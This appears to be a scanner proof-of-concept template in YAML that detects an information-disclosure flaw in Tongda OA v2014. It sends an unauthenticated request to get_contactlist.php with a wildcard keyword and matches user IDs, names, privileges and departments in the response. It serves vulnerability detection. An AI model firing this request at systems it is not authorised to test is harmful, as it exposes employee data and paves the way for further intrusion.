expression: r0()
id: tongda-contact-list-disclosure
info:
  author: zan8in
  description: "\u901A\u8FBEOA v2014 get_contactlist.php\u6587\u4EF6\u5B58\u5728\u4FE1\
    \u606F\u6CC4\u6F0F\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\u6D1E\
    \u53EF\u4EE5\u83B7\u53D6\u654F\u611F\u4FE1\u606F\uFF0C\u8FDB\u4E00\u6B65\u653B\
    \u51FB\napp=\"TDXK-\u901A\u8FBEOA\"\n"
  name: "\u901A\u8FBEOA v2014 get_contactlist.php \u654F\u611F\u4FE1\u606F\u6CC4\u6F0F\
    \u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2014%20get_contactlist.php%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
  severity: high
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"user_uid":')
      && response.body.bcontains(b'"user_name":') && response.body.bcontains(b'"priv_name":')
      && response.body.bcontains(b'"dept_name":')
    request:
      method: GET
      path: /mobile/inc/get_contactlist.php?P=1&KWORD=%25&isuser_info=3
